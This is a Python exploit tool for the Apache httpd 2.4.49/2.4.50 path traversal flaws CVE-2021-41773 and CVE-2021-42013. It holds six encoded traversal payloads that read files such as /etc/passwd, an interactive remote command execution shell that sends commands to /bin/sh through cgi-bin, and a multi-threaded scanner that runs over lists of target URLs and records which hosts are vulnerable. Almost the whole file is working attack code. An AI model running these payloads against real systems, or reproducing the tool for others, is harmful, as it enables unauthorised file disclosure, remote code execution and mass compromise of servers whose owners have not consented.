#coding:utf-8
#Author:LSA
#Description:apache httpd path traversal cve-2021-41773 and cve-2021-42013
#Date:20211011



from urllib import request
import sys
import optparse
import threading
import datetime
import os
import queue
import ssl

#reload(sys)
#sys.setdefaultencoding('utf-8')


context = ssl._create_unverified_context()

header = {
       'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11',
    }

commonDirList = ['/cgi-bin', '/icons', '/assets', '/uploads', '/img', '/image']


#cve-2021-41773
poc0 = "/.%2e/%2e%2e/%2e%2e/%2e%2e"

poc1 = "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e"


#cve-2021-42013
poc2 = "/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65"

poc3 = "/.%%32%65/.%%32%65/.%%32%65/.%%32%65"

poc4 = "/.%%32e/.%%32e/.%%32e/.%%32e"

poc5 = "/.%2%65/.%2%65/.%2%65/.%2%65"

#rce data
rce0 = "echo;id"

rce1 = "echo Content-Type: text/plain; echo; id"


pocList = [poc0,poc1,poc2,poc3,poc4,poc5]

rcePostDataList = [rce0,rce1]

#proxy_host = "127.0.0.1:8000"

countLines = 0

succ = 0

vulnerableUrlCdirList = []

def checkApacheHttpdPathTraversal(url,timeout):

    flagReadFile = "/etc/passwd"
    flagRspString = "root:"
    isVulnerable = False

    for poc in pocList:
        for cdir in commonDirList:
            fullUrl = url + cdir + poc + flagReadFile
            try:
                req0 = request.Request(fullUrl,headers=header,method='GET')
                #req0.set_proxy(proxy_host,'http')
                rsp0 = request.urlopen(req0,timeout=timeout,context=context)
                rsp0Content = str(rsp0.read())
                #print(response.read().decode('utf8'))

                if(flagRspString in rsp0Content):
                    print("[use poc" + str(pocList.index(poc)) +"] " + "<" + url + cdir + ">" + " is vulnerable!!!")
                    isVulnerable = True

                    return url+cdir

                    #break

            except Exception as e:
                print("[use poc" + str(pocList.index(poc)) +"] " + "<" + url + cdir + ">" + " cauused exception.")
                print(e)
        #if isVulnerable:
        #    break

    #if(isVulnerable == False):
    print("[use all poc" + str(pocList.index(poc)) +"] " + "<" + url + ">" + " attacked fail.")
    return False

def checkApacheHttpdPathTraversalBatch(urlQueue,timeout):

    global countLines
    global succ

    global vulnerableUrlCdirList

    while not urlQueue.empty():
        try:
        
            url = urlQueue.get()
            print(url)
            qcount = urlQueue.qsize()
            print("Checking " + url + "---[" + str(countLines - qcount) + "/" + str(countLines) + "]")
            vulnerableUrlCdir = checkApacheHttpdPathTraversal(url,timeout)
            if(vulnerableUrlCdir):
                vulnerableUrlCdirList.append(vulnerableUrlCdir)
                succ = succ + 1

        except:
            continue



def exploit4readFile(url,commonDir,timeout):

    choosePoc = input("choose a poc(0[/.%2e/%2e%2e/],1[.%2e],2[%%32%65%%32%65],3[.%%32%65],4[.%%32e],5[.%2%65]):")

    chooseReadFile = input("choose a file to read(such as /etc/passwd):")

    fullUrl = url + commonDir + pocList[int(choosePoc)] + chooseReadFile
    try:
        req1 = request.Request(fullUrl,headers=header,method='GET')
        #req0.set_proxy(proxy_host,'http')
        rsp1 = request.urlopen(req1,timeout=timeout,context=context)
        rsp1Content = str(rsp1.read())
        #print(response.read().decode('utf8'))
        print(rsp1Content)

    except Exception as e:
        print("[use poc" + choosePoc +"] " + "<" + url + commonDir + ">" + " cauused exception.")
        print(e)


def exploit4rce(url,commonDir,rceShell,timeout):

    choosePoc = input("choose a poc(0[/.%2e/%2e%2e/],1[.%2e],2[%%32%65%%32%65],3[.%%32%65],4[.%%32e],5[.%2%65]):")

    choosePostDataFormat = input("choose PostDataFormat(0[echo;id]),1[echo Content-Type: text/plain; echo; id]:")
    
    while True:
        command = input("cmd>>>")
        if(command == 'exit'):
            break
        fullUrl = url + commonDir + pocList[int(choosePoc)] + rceShell

        if(choosePostDataFormat == '0'):
            postData = 'echo;{}'.format(command)
        if(choosePostDataFormat == '1'):
            postData = 'echo Content-Type: text/plain; echo; {}'.format(command)

        #postData = bytes(postData,'utf-8')

        try:
            req2 = request.Request(fullUrl,headers=header,data=postData.encode())
            #req2.set_proxy(proxy_host,'http')
            rsp2 = request.urlopen(req2,timeout=timeout,context=context)
            rsp2Content = str(rsp2.read())
            #print(response.read().decode('utf8'))
            print(rsp2Content)

        except Exception as e:
            print("[use poc" + choosePoc +"+" + rcePostDataList[int(choosePostDataFormat)] + "] " + "<" + url + commonDir + ">" + " cauused exception.")
            print(e)






if __name__ == '__main__':
    
    print( '''
    ***********************************************************************
    *   check and exploit apache httpd 2.4.49 and 2.4.50 path traversal   * 
    *                            Coded by LSA                             * 
    ***********************************************************************
    ''')

    parser = optparse.OptionParser('python %prog ' + '-h (manual)', version='%prog v1.0')

    parser.add_option('-u', dest='tgtUrl', type='string', help='single url')

    parser.add_option('-f', dest='tgtUrlsPath', type='string', help='urls filepath')

    parser.add_option('-s', dest='timeout', type='int', default=20, help='timeout(seconds)')

    parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')

    parser.add_option('--cdir', dest='commonDir', type='string', default="/cgi-bin/", help='common dir path(default:/cgi-bin/)')

    parser.add_option('--readfile', dest='readFileMode', action='store_true', help='read file path')

    parser.add_option('--rce', dest='rceMode',action='store_true', help='rce mode')

    parser.add_option('--rceshell', dest='rceShell',type='string', default="/bin/sh", help='rce shell(default:/bin/sh)')

    (options, args) = parser.parse_args()

    timeout = options.timeout

    tgtUrl = options.tgtUrl

    commonDir = options.commonDir

    readfileMode = options.readFileMode

    rceMode = options.rceMode

    rceShell = options.rceShell

    tgtUrlsPath = options.tgtUrlsPath

    if tgtUrl and (rceMode is None) and (readfileMode is None):
        checkApacheHttpdPathTraversal(tgtUrl,timeout)

    if tgtUrl and (rceMode is None) and readfileMode:
        exploit4readFile(tgtUrl,commonDir,timeout)

    if tgtUrl and rceMode and (readfileMode is None):
        exploit4rce(tgtUrl,commonDir,rceShell,timeout)

    if tgtUrlsPath:
        urlQueue = queue.Queue()
        with open(tgtUrlsPath,'r') as f:
            urls = f.readlines()
            for url in urls:
                urlQueue.put(url.strip())

        countLines = urlQueue.qsize()

        threads = options.threads
        threadList = []
        for thread in range(threads):
            t = threading.Thread(target=checkApacheHttpdPathTraversalBatch,args=(urlQueue,timeout))
            t.start()
            threadList.append(t)

        for tl in threadList:
            tl.join()

        nowtime = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
        os.mkdir('batch_result/' + str(nowtime))

        with open('batch_result/'+str(nowtime)+'/'+'success.txt','w') as fsucc:
            for vuc in vulnerableUrlCdirList:
                fsucc.write(vuc+'\n')

        print('\n###Finished! [success/total]: ' + '[' + str(succ) + '/' + str(countLines) + ']###')
        print('Results were saved in ./batch_result/' + str(nowtime) + '/')





